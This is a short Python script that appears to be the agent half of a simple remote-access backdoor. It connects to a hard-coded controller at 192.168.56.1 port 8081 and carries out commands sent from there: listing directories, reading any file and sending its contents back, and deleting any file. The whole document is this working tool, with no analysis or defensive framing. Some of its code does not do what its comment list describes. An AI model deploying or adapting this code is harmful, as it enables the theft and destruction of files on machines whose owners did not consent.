'''
command list:
    -view cwd: show all the file in the directory
    -custom_dir: shows the files in the custom directory (selected one)
    -copy_file: download files from directory
    -remove_file: remove a file
'''
import socket
import os
s=socket.socket()
host='192.168.56.1'
port=8081
s.connect((host, port))
print("\nconnected successfully")

while True:
    command=s.recv(4096)
    command=command.decode()
    print(command)
    print("\ncommand recived")
    
    if command=='view_cwd':
        files=os.getcwd()
        files=str(files)
        s.send(files.encode())
        print("\ncommand executed")
    
    if command =='custom_dir':
        custom_dir=s.recv(4096)
        custom_dir=custom_dir.decode()
        files=os.listdir(custom_dir)
        files=str(files)
        s.send(files.encode())
        print('\ncommand executed')
     
    if command=='copy_file':
        filepath=s.recv(4096)
        filepath=filepath.decode()
        file=open(filepath, 'rb')#rb: readbytes mode
        data=file.read()
        s.send(data)
        print('\nfiles sent')
    
    if command=='remove_file':
        filepath=s.recv(4096)
        filepath=filepath.decode()
        os.remove(filepath)
        print('\ncommand executed')